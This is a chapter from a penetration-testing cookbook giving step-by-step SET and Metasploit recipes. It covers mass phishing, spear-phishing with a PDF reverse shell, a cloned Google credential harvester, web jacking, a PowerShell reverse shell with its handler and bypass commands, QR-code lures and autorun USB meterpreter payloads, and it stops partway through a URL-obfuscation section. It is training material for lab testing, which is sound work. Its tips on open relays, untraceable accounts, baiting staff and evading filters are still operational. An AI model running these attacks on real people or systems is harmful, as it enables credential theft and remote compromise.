<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Social Engineering</h1>
                </header>
            
            <article>
                
<p class="mce-root CDPAlignLeft CDPAlign">In this chapter, we will cover the following topics:</p>
<ul>
<li>Phishing attacks</li>
<li>Spear-phishing attacks</li>
<li>Credential harvesting with SET</li>
<li>Web jacking</li>
<li>PowerShell attack vector</li>
<li>QRCode attack vector</li>
<li>Infectious media generator</li>
<li>Obfuscating and manipulating URLs</li>
<li>DNS spoofing and ARP spoofing</li>
<li>DHCP spoofing</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Introduction</h1>
                </header>
            
            <article>
                
<p>Social Engineering is a unique aspect of penetration testing. Social Engineering can be employed through electronic means, as we will see in the upcoming recipes. However, Social Engineering is also used in physical penetration testing and even data gathering. It becomes an art about human nature and cultural norms. We bend well-known natural tendencies to help us accomplish or obtain what we want.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Phishing attacks</h1>
                </header>
            
            <article>
                
<p>Phishing attacks are attacks that are loosely targeted at any individual or any entity. Their main value is one of mass distribution, hoping to get a small percentage of hits across a large distribution. These are sometimes used in penetration testing and targeting-specific domains owned by the client. These attacks are targeted specifically at emails. And due to <span>their </span>large distribution, the attacks are often caught quickly across many advanced email spam filtering companies. But it takes only one to get through and be clicked on.</p>
<p><span>In this recipe, we will create and launch a generic phishing attack.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running, and you are logged in as root</li>
<li>You have some email accounts to use and/or preferably a lab SMTP server</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will use the <strong>Social Engineering Tool</strong> (<strong>SET</strong>) to create a phishing attack:</p>
<ol>
<li>From the <span class="packt_screen">Applications</span> menu, select <span class="packt_screen">Social Engineering Tools</span> | <span class="packt_screen">SET Social Engineering Toolkit</span>. You will be presented with the following screen:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="169" width="305" class="image-border" src="assets/ad02c14d-0333-4b82-84ba-8634c8499a43.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Initial set toolkit screen</div>
<ol start="2">
<li>Select the top option: <kbd>1) Social-Engineering Attacks</kbd>.</li>
<li>Select <kbd>5) Mass Mailer Attack</kbd>.</li>
<li>Select <kbd>2) E-Mail Attack Mass Mailer</kbd>.</li>
<li>The system will now ask you to select a file that includes an email list in the format of one email address per line. Enter the path and filename to use. In my case, I have a list prepared at <kbd>/root/emaillist.txt</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="198" width="465" class="alignnone size-full wp-image-976 image-border" src="assets/cae1f525-274d-4418-98bf-e91bfbb3df66.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">SET mass mailer dialog screen</div>
<div class="packt_tip">Building a list of email addresses is important and this is where the work done in <a href="48d70dd4-e446-4efa-9f68-eae64fddd3ac.xhtml" target="_blank">Chapter 2</a>, <em>Reconnaissance and Scanning</em> plays an important role. If you did a good job there, you should have a list of email addresses already or at the very least, you will have a good idea of how they format their usernames for emails. Often you can use resources like LinkedIn to add to the list of email addresses as well.</div>
<ol start="6">
<li>Now, we will be asked how we want to use our email attack, either through a Gmail account or own server/relay. For our purposes, I am going to use a throw-away Gmail account; however, in practice, I would typically use an open relay. Select <kbd>1. Use a gmail Account for your email attack</kbd>.</li>
</ol>
<div class="packt_tip">Never use a server or account that can be personally identifiable. The best way is to use an open-relay. There are plenty of them out there if you look for them. </div>
<ol start="7">
<li>Enter your throw-away Gmail account: <kbd>johndoe@example.com</kbd> and press <em>Enter</em>.</li>
<li>Enter a name to use as the sender that the user will see: <kbd>John Doe</kbd><span>.</span></li>
<li>Enter the account password and press <em>Enter</em>.</li>
<li>Decide whether you want to send the message with high priority, and type <kbd>yes</kbd> or <kbd>no</kbd> then press <em>Enter</em>.</li>
<li>Decide whether you want to attach a file. In my case, I want to attach a file with a malicious payload. So, I will type <kbd>y</kbd><strong> </strong>and press <em>Enter</em>.</li>
<li>I will attach my <kbd>/root/salary.pdf</kbd> malicious payload.</li>
</ol>
<div class="packt_tip">You need to either attach a malicious payload or a malicious link for the phishing attack to work. Figure out what makes most sense for your test and go forward with it. </div>
<ol start="13">
<li>Enter an email subject. In my case, I am going to call it <kbd>Salary Info</kbd>.</li>
<li>I have the option to send as HTML or plain text. I am going to choose the plain text for simplicity. Next, I will press <em>Enter</em>.</li>
</ol>
<div class="packt_tip">If you plan on embedding a malicious link, you must choose HTML. Most users are accustomed to seeing HTML pages today that by sending as a plain text may actually increase there suspicion that the email may be farudulent. But for example purposes, it will work fine.</div>
<ol start="15">
<li>Now, enter the body of the message. I plan on keeping this very short and simple:</li>
</ol>
<pre style="padding-left: 60px"><strong>Hi Jane,</strong><br/><strong>Here is the Salary Information you requested. <br/></strong><br/><strong>Thanks </strong><br/><strong>John </strong><br/><strong>END </strong><br/><strong>Hi</strong> </pre>
<ol start="16">
<li>It will then output the email addresses that the message was sent to.</li>
</ol>
<div class="packt_infobox">It's very important to put time and energy into properly crafting the email and the attachment or link, so you have more chances of it being successful. Therefore, double check for spelling and grammar issues.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Spear-phishing attacks</h1>
                </header>
            
            <article>
                
<p>Spear-phishing attacks are specifically targeted at an individual or entity. Their main value is that they are targeted at a small group of users. These are quite often used in penetration testing, targeting specific email addresses of the client. You must spend more time in researching the client by gathering information, such as email signatures, logos, and understanding what the communications from the customer may look like. Often, you may register a look-a-like domain that may seem familiar when they see the <kbd>from</kbd> message. </p>
<p><span>In this recipe, we will create and launch a targeted spear-phishing attack.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running, and you are logged in as root</li>
<li>You have some email accounts and/or preferably a lab SMTP server</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now use set to create a spear-phishing attack:</p>
<ol>
<li>From the <span class="packt_screen">Applications</span> menu, select <span class="packt_screen">Social Engineering Tools</span> | <span class="packt_screen">SET Social Engineering Toolkit</span>. You will be presented with the following screen:</li>
</ol>
<div style="margin: 0in;font-family: Calibri;font-size: 11.0pt;color: black" class="CDPAlignCenter CDPAlign"><img height="164" width="298" class="alignnone size-full wp-image-977 image-border" src="assets/688c7523-a855-4cf4-81b0-18f3122f6f5d.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Initial setookit screen</div>
<ol start="2">
<li>Select the top option: <kbd>1) Social-Engineering Attacks</kbd>.</li>
<li>Select <kbd>1) Spear-Phishing Attack Vectors</kbd>.</li>
<li>Select <kbd>1) Perform a Mass Email Attack</kbd>.</li>
<li>From here, we will have several optional attack vectors that we can use. Pick a suitable one based on the email you will be sending, and what you believe the customer has and uses for the software. For our testing purposes, we will use <kbd>13) Adobe PDF Embedded EXE Social Engineering</kbd>.</li>
<li>So, this will embed the attack either in a provided PDF or a blank PDF. For our test purposes, we will simply use <kbd>2) Use built-in BLANK PDF for attack</kbd>.</li>
</ol>
<div class="packt_tip">When penetration testing with spear-phishing, you may have some desired outcomes in mind. However, it's important to remember that one of those outcomes is to avoid raising suspicions. Because of this, the more the email seems appropriate in its entirety, the better off you are. Say, if you were doing this in a healthcare situation, you could download some HIPAA regulations in a PDF format, insert the malware, and send it to the appropriate people in the organization. When they open it, they will see what they expect, therefore helping you to mask the fact that they were just and not alerting them to an issue.</div>
<ol start="7">
<li>Next, you have several options for the return callback to you. Reverse shell or reverse meterpreter are always good options. Select <kbd>1) Windows Reverse TCP shell</kbd>.</li>
<li>We will set the IP address of our Kali box. Use your appropriate IP address; in my case, I will use <kbd>192.168.56.10</kbd>.</li>
<li>Set the port to connect back on. For test purposes, I will use <kbd>8123</kbd>.</li>
<li>Select <kbd>2. Rename the file, I want to be cool.</kbd> A<span>nd rename the file to something appropriate for the context of use.</span></li>
<li>For this, we will just select <kbd>1. E-Mail attack Single email address</kbd>.</li>
<li>Select <kbd>1. Pre-Defined Template</kbd>.</li>
</ol>
<div class="packt_tip">In most cases, you will want to create your own template for this, but, as we did that in <span>the phishing attacks recipe</span>, you can refer back for more information. Also, most spam engines know the format of these built-in templates, so the attacks will be thwarted with relative ease.</div>
<ol start="13">
<li>Pick an available template. <kbd>3: Have you seen this?</kbd> will be fine for our example.</li>
<li>Enter the address to send the email to <kbd>johndoe@example.com</kbd>.</li>
<li>In this case. let's see if we can find an open relay to bounce it off. Do some searching on Google, or you can try to use your ISP email server for this. Select <kbd>2. Use your own server or open relay</kbd>.</li>
</ol>
<div class="packt_tip">If you cannot find one, you can revert to a Gmail account and use the steps as outlined in recipe 5.1.</div>
<ol start="16">
<li>Enter appropriate sender address: <kbd>Janedoe@example.com</kbd>.</li>
<li>Enter appropriate sender name: <kbd>Jane Doe</kbd>.</li>
<li>If you require a username for your relay server, you can enter the user information as appropriate. I will leave mine blank.</li>
<li>If you require a password for your relay server, you can enter the password information as appropriate. I will leave mine blank.</li>
<li>Enter the mail server address or <span><strong>Fully Qualified Domain Name</strong> (</span><strong>FQDN</strong>).</li>
<li>Enter the port number for the SMTP service of the relay. I will leave mine at <kbd>25</kbd>.</li>
<li>I will select <span class="packt_screen">No</span> to flag the message as high priority.</li>
<li>Lastly, does my server support TLS? For this, I will select <span class="packt_screen">No</span> as well.</li>
<li>From here, you will automatically be given the option to set up a listener, and it will autolaunch the <kbd>msfconsole</kbd> and set the appropriate listener for you. Since I like Armitage, I will open my listener through it. </li>
</ol>
<div class="packt_infobox">Refer back to recipe in <a href="9f678d15-2115-4e29-a75d-03dba65d3398.xhtml" target="_blank">Chapter 4</a>, <em>Finding Exploits in the Target</em> of<em> Basic exploit attacks with Armitage</em> and <em>Advanced attacks with Armitage</em> on how to open listeners in Armitage.</div>
<ol start="25">
<li>I open the PDF from the email, and I will see a blank PDF. But notice that in my Armitage console, it will now show a connection to the Windows XP machine.</li>
</ol>
<div class="packt_tip packt_infobox">I downloaded and used an older version of Acrobat Reader on my Windows XP machine.</div>
<div class="CDPAlignCenter CDPAlign"><img height="491" width="653" class="alignnone size-full wp-image-978 image-border" src="assets/3f896208-a522-40c8-a724-629d51d7ba7d.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Windows XP machine with hipaaregs.pdf opened</div>
<div class="CDPAlignCenter CDPAlign"><img height="415" width="600" class="alignnone size-full wp-image-979 image-border" src="assets/ed4b68c1-37a3-4fd3-8f31-d14d246acbc2.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Kali Linux Armitage handler screen indication XP machine connected</div>
<div class="packt_tip">Again, many AV and SPAM engines are familiar with these attacks, and there will be a high rate of detection, unless you really spend some time in crafting the messages well and creating your own customized payload to get through the detection engines.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Credential harvesting with SET</h1>
                </header>
            
            <article>
                
<p>Credential harvesting can be used with many different types of attacks, but the ultimate goal is to make the user believe he has reached the site that he was trying to get to, such as Facebook or Google, and steal their credentials when they attempt to log in.</p>
<p><span>In this recipe, we will mimic a site and perform credential harvesting for accounts for that site.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running, and you are logged in as root</li>
<li>Move the interface from one of your Windows test machines to the NAT network temporarily</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now impersonate a real web site to gather credentials:</p>
<ol>
<li>From the <span class="packt_screen">Applications</span> menu, select <span class="packt_screen">Social Engineering Tools</span> | <span class="packt_screen">SET Social Engineering Toolkit</span>. You will be presented with the following screen:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="172" width="312" class="alignnone size-full wp-image-980 image-border" src="assets/fc217886-b767-4bb8-ac9e-c877f990c6b7.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Initial setoolkit screen</div>
<ol start="2">
<li>Select the top option, <kbd>1) Social-Engineering Attacks</kbd>.</li>
<li>Select <kbd>2) Website Attack Vectors</kbd>.</li>
<li>Select <kbd>3) Credential Harvester Attack Method</kbd>.</li>
<li>Select <kbd>1) Templates</kbd>.</li>
</ol>
<p> </p>
<ol start="6">
<li>You will then be asked for the IP address of the post. Enter the IP address of Kali on the NAT network. You can open another terminal window and do <kbd>ifconfig</kbd><span>. I will enter</span> <kbd>10.0.2.4</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="350" width="531" class="alignnone size-full wp-image-981 image-border" src="assets/5d606367-8e35-435f-a47f-2ef602d917c8.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">ifconfig output of Kali machine</div>
<ol start="7">
<li>We will be given a list of predefined templates, so let's use <kbd>2. Google</kbd>.</li>
<li>The harvester will automatically launch and be displayed on your screen.</li>
</ol>
<p> </p>
<ol start="9">
<li>From the Windows machine, log in and browse to the IP address of your Kali device as previously entered:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img style="text-align: center;color: #333333;font-size: 1em" height="585" width="776" class="alignnone size-full wp-image-982 image-border" src="assets/30cb7e16-fdd0-4371-b8a4-7826eefb3a1a.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Fake Google login page</div>
<ol start="10">
<li>You get a very familiar looking login screen; however; up at the top, it provides an IP address versus Google. </li>
</ol>
<div class="packt_tip">So, to make this more believable, you would want to hide the IP address. Do you have any thoughts? There are two options. Firstly, if you have previously compromised the device, you could modify the host file; alternatively, you could use DNS/DHCP spoofing.</div>
<ol start="11">
<li>Enter test credentials and click on <span class="packt_screen">Sign in</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="240" width="228" class="alignnone size-full wp-image-983 image-border" src="assets/950f03af-4d8f-46c8-8cbf-f9e92199a397.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Fake login screen</div>
<ol start="12">
<li>Notice that, on the Windows machine, you will be redirected to Google. However, look at <kbd>SET</kbd>, and notice we harvested the credentials:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="268" width="367" class="alignnone size-full wp-image-984 image-border" src="assets/0cb5053c-805c-4600-a8d9-2956b636af6f.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Set output of credentials</div>
<ol start="13">
<li>Type <kbd>Control-C</kbd> and press <em>Enter</em>; this will return you to the <kbd>SET</kbd> console.</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Web jacking </h1>
                </header>
            
            <article>
                
<p>Web jacking is a method where the user will be presented with a website saying the site has moved, and when they are redirected, they have malware inserted in the browser/computer. </p>
<p><span>In this recipe, we will web jack a site.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running, and you are logged in as root</li>
<li>Move the interface of one of your Windows test machines to the NAT network temporarily</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now perform web jacking by simulating a site redirect:</p>
<ol>
<li>From the <span class="packt_screen">Applications</span> menu, select <span class="packt_screen">Social Engineering Tools</span> | <span class="packt_screen">SET Social Engineering Toolkit</span>. You will be presented with the following screen:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="157" width="286" class="alignnone size-full wp-image-985 image-border" src="assets/19762bac-145f-4a80-8920-041516476c4c.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Initial setookit screen</div>
<ol start="2">
<li>Select the top option, <kbd>1) Social-Engineering Attacks</kbd>.</li>
<li>Select <kbd>2) Website Attack Vectors</kbd>.</li>
<li>Select <kbd>5) Web Jacking Attack Method</kbd>.</li>
<li>We will select <kbd>2) Site Cloner</kbd>.</li>
<li>Enter the IP address of the post again. In this case, my IP of <kbd>10.0.2.4</kbd>.</li>
<li>Enter the URL site you want to clone. A sample site you can use is <a href="http://us-123hiking.simplesite.com/">http://us-123hiking.simplesite.com/.</a></li>
<li>This system will automatically clone the site and start the <kbd>msfconsole</kbd>.</li>
<li>From here, open one of your Windows VM. I will use the Windows 7 machine and browse to <kbd>http://10.0.2.4</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="438" width="562" class="alignnone size-full wp-image-986 image-border" src="assets/6fe6b093-68c0-49ae-b2df-2da2e7a94f60.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Fake website screen</div>
<ol start="10">
<li>I see a link up at the top, so I click on it to open the dialog:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="246" width="339" class="alignnone size-full wp-image-987 image-border" src="assets/67f22e33-6dc8-4e2a-95b5-cfd6a9b2da42.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Run dialog box</div>
<ol start="11">
<li>Then, I click on <span class="packt_screen">Run</span> from the machine.</li>
<li>From there, if I go back to Kali, I will see a new session has been opened:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="138" width="1024" class="alignnone size-full wp-image-988 image-border" src="assets/596b5c20-0785-4e76-978d-b8f3436df6fa.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">MSF exploit session connected screen</div>
<ol start="13">
<li>Type <kbd>sessions 1</kbd> and press <em>Enter</em> at the <kbd>msf &gt;</kbd> prompt to attach you to the computer.</li>
<li>Type <kbd>sysinfo</kbd> and press <em>Enter</em> <span>to get access to the system.</span></li>
<li>From here, you can try some other commands in the <kbd>msfconsole</kbd> to play around, but, at this point, you have access to the PC.</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">PowerShell attack vector</h1>
                </header>
            
            <article>
                
<p>In this recipe, we will use PowerShell to connect back to our Kali host. PowerShell has been included with Windows Vista and beyond and has become a very popular attack vector due to the capabilities of the shell. We will not focus on how to get the script there, as we have covered options in other recipes; this will just focus on creating the malicious payload.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running, and you are logged in as root</li>
<li>Move the interface of one of your Windows test machines to the NAT network temporarily</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now use PowerShell to attack a host:</p>
<ol>
<li>From the <span class="packt_screen">Applications</span> menu, select <span class="packt_screen">Social Engineering Tools</span> | <span class="packt_screen">SET Social Engineering Toolkit</span>. You will be presented with the following screen:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="167" width="303" class="alignnone size-full wp-image-989 image-border" src="assets/c27340f7-c216-4b06-adf9-d17f153701f1.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Initial setoolkit screen</div>
<ol start="2">
<li>Select the top option, <kbd>1) Social-Engineering Attacks</kbd>.</li>
<li>Select <kbd>9) Powershell Attack Vectors</kbd>.</li>
</ol>
<p> </p>
<ol start="4">
<li>Select <kbd>2) Powershell Reverse Shell</kbd>.</li>
<li>Enter the IP address of your Kali host <kbd>192.168.56.10</kbd>.</li>
<li>Enter the listener port <kbd>8123</kbd>.</li>
<li>Select <span class="packt_screen">No</span> <span>when asked to start a listener, as we will use Metasploit for that.</span></li>
<li>A file will be created in the following location <span><kbd>~/.set/reports/powershell/powershell.reverse.txt</kbd>. Move this file to the Windows machine, and change its extension from TXT to PS1.</span></li>
<li>Since we will use the <kbd>msfconsole</kbd> for our listener, let's get it prepared by entering the following commands in a terminal window. We will use our Kali Linux host-only, IP address of <kbd>192.168.56.10</kbd>, <span>and our listener port of</span> <kbd>8123</kbd>:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd </strong><br/><strong>service postgresql start </strong><br/><strong>msfconsole </strong><br/><strong>handler -p generic/shell_reverse_tcp -H 192.168.56.10 -P 8123 </strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="128" width="616" class="alignnone size-full wp-image-990 image-border" src="assets/0e6eed83-a525-450a-8ce7-c4a5df6447ba.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">MSF initialization screen</div>
<ol start="10">
<li>From your Windows 7 machine, open a Command Prompt, and type the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>powershell -ExecutionPolicy Bypass -file c:\share\powershell.reverse.ps1</strong></pre>
<div class="mce-root CDPAlignCenter CDPAlign"><img height="223" width="472" class="alignnone size-full wp-image-991 image-border" src="assets/8cb9f686-0223-47b2-bbf9-9b6104e4f658.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">PowerShell output</div>
<ol start="11">
<li>You will notice that we now have a connection on session 1, so let's open it by typing <kbd>sessions 1</kbd>. From here, we can enter a simple command like <kbd>dir</kbd> to get a directory listing:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="310" width="394" class="alignnone size-full wp-image-993 image-border" src="assets/61801c51-9e7e-4f5d-bdbe-80b924e6c85f.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Dir output from msf</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">QRCode attack vector</h1>
                </header>
            
            <article>
                
<p>In this recipe, we will generate a QRCode for a site that we own, to harvest credentials. This can be sent through various means such as email, Facebook, twitter post, or even by using it as part of a flyer that you leave on target vehicles. We will send this QRCode to our target.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running, and you are logged in as root</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will create a QRCode which redirect to a website:</p>
<ol>
<li>From the <span class="packt_screen">Applications</span> menu, select <span class="packt_screen">Social Engineering Tools</span> | <span class="packt_screen">SET Social Engineering Toolkit</span>. You will be presented with the following screen:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img style="text-align: center;color: #333333;font-size: 1em" height="168" width="304" class="image-border" src="assets/a478fff6-30ec-43c3-894f-4c2634481881.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Initial set toolkit screen</div>
<ol start="2">
<li>Select the top option <kbd>1) Social-Engineering Attacks</kbd>.</li>
<li>Select <kbd>8) QRCode Generator Attack Vector</kbd>.</li>
<li>Enter the malicious URL; for our test purposes, we will simply enter <kbd>www.packtpub.com</kbd>.</li>
<li>It will generate the image file and provide the location.</li>
<li>Open the image file on your Kali VM, like so: </li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="111" width="111" class="alignnone size-medium wp-image-702 image-border" src="assets/6ff91a06-f21a-426c-862f-bd07e5ee3a3a.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Generated QRCode</div>
<ol start="7">
<li>Most phones will scan this image and take you to the website indicated.</li>
</ol>
<div class="packt_infobox">Apple iOS requires a third-party app - however, it is supposed to be included in iOS 11. </div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>Alone this attack may seem meagre, but it is a very effective attack. First, you can pretty much design any website you want and use it to capture credentials. Think about putting flyers in a company parking lot that says scan this QRCode and sign up to get a free 5.00 gift card to Starbucks. How many of those people do you think you can get significant information on? </p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Infectious media generator</h1>
                </header>
            
            <article>
                
<p>In this recipe, we will build an infectious file that can be put on USBs, CDs, or DVDs. We will generate a malicious payload that will autorun when entered into a victim PC. We will simulate the execution; however, if you have physical test machines, it is much easier to test.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running, and you are logged in as root</li>
<li>Windows VM is up and running</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will build our infections media:</p>
<ol>
<li>From the <span class="packt_screen">Applications</span> menu, select <span class="packt_screen">Social Engineering Tools</span> | <span class="packt_screen">SET Social Engineering Toolkit</span>. You will be presented with the following screen:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="172" width="313" class="alignnone size-full wp-image-1031 image-border" src="assets/6142027b-d0b6-4076-b784-9b96b15c649b.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Initial setookit screen</div>
<ol start="2">
<li>Select the top option <kbd>1) Social-Engineering Attacks</kbd>.</li>
<li>Select <kbd>3) Infectious media generator</kbd><span>.</span></li>
<li>Select <kbd>2) Standard Metasploit Executable</kbd>.</li>
<li>Let's use <kbd>2) Windows Reverse_TCP Meterpreter</kbd>.</li>
<li>For the <kbd>LHOST</kbd>, use the IP address of your Kali machine <kbd>192.168.56.10</kbd>.</li>
<li>Enter the port for callback <kbd>8123</kbd>.</li>
<li>It will then generate the payload. Go ahead and start a listener right now:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="108" width="476" class="alignnone size-full wp-image-1032 image-border" src="assets/66e6f575-90c5-4572-a566-c3342899f359.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Payload generation output</div>
<ol start="9">
<li>From here, we have an autorun option that we can burn to a DVD or CD or put on <span>a USB. This is a bit difficult to simulate with our virtual machines, so we will simply copy the <kbd>program.exe</kbd> file from <kbd>~/.set/autrun/program.exe</kbd> and put it on our Windows 7 test machine to run it.</span></li>
<li>From your Windows machine, open the <kbd>program.exe</kbd> <span>file simulating an autorun execution. Notice that, upon running it, there are no visible signs of execution. This would be the same if it was autorun from a USB stick: </span></li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img style="text-align: center;color: #333333;font-size: 1em" height="505" width="653" class="alignnone size-full wp-image-1035 image-border" src="assets/8a35bc27-e182-4536-b333-543824d51ccc.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Payload execution on Windows VM</div>
<ol start="11">
<li>From our Kali machine, you will notice that we have a new session connected. Type <kbd>sessions</kbd> to see the connected devices:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="209" width="700" class="alignnone size-full wp-image-1036 image-border" src="assets/926abe38-b7b5-4294-95da-ff5ea034340e.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">MSF session connected</div>
<ol start="12">
<li>Enter <kbd>sessions 1</kbd>, and from here, we are now connected to our target machine in a meterpreter session; to validate our connection, we type <kbd>sysinfo</kbd>:</li>
</ol>
<p><img style="text-align: center;color: #333333;font-size: 1em" height="162" width="705" class="alignnone size-full wp-image-1037 image-border" src="assets/09d1345e-1cdf-4da7-ad7b-993398427992.png"/></p>
<div class="packt_figref CDPAlignCenter CDPAlign">MSF sysinfo output</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>This is a great attack to use with USB sticks. If you are actively working with a company on a penetration testing engagement you can spread them around the company entrances and parking lots. There is a high likelihood that at least a few of them will be plugged in giving you access to the target network.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Obfuscating and manipulating URLs</h1>
                </header>
            
            <article>
                
<p>Obfuscating and manipulating URLs has long been used to assist in tricking an end user into clicking on a malicious site. These could be through various techniques such as using URL shortening, hiding the URL, using the IP address, and other functions. This can be used in emails or other types of interactive documents.</p>
<p><span>In this recipe, we will examine a couple of methods to obfuscate or manipulate URLs.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running, and you are logged in as root</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now review several methods of obfuscating URLS:</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">URL shortener</h1>
                </header>
            
            <article>
                
<p>Let's work with a URL shortener first:</p>
<ol>
<li>From you main Kali screen, open a Firefox browser. <img src="assets/4c351d87-54b2-4e0f-bdbd-9d7fc866e44c.png"/></li>
<li>Go to the <a href="https://goo.gl">https://goo.gl</a> link. Enter a URL you want to shorten. The following is an example I'm using:</li>
</ol>
<p style="padding-left: 90px"><a href="https://www.nytimes.com/2017/05/15/technology/personaltech/heres-how-to-protect-yourself-from-ransomware-attacks.html">https://www.nytimes.com/2017/05/15/technology/personaltech/heres-how-to-protect-yourself-from-ransomware-attacks.html</a></p>
<p style="padding-left: 90px"><a href="https://www.nytimes.com/2017/05/15/technology/personaltech/heres-how-to-protect-yourself-from-ransomware-attacks.html"/></p>
<ol start="3">
<li>Select <span class="packt_screen">I'm not a Robot</span> and click on <span class="packt_screen">SHORTEN URL</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="478" width="658" class="alignnone size-full wp-image-1038 image-border" src="assets/21ae5fbc-6e78-4031-a1a2-3e84f4e38d42.png"/></div>
<ol start="4">
